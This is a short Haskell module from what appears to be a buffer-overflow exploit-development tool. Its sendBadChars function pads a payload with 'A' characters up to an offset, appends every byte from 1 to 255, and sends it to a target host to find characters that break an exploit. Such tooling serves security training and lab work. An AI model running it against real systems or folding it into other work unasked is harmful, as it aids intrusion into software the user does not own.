module Overflow.BadChars
( sendBadChars
) where

import Overflow
import Data.Text (Text)
import Data.Char (chr)

-- |...
sendBadChars :: Host -> Int -> (Maybe Text, Maybe Text) -> IO () 
sendBadChars h o a = do
        putStrLn "    ───> Sending all characters to target."
        sendPayload h payload >>= out 
    where
        payload   = createPayload ((replicate o 'A') ++ (map chr [1..255])) a
        out  True = putStrLn "Done! Finished sending all characters to target."
        out False = putStrLn "Error: An error occurred sending payload to target."
    
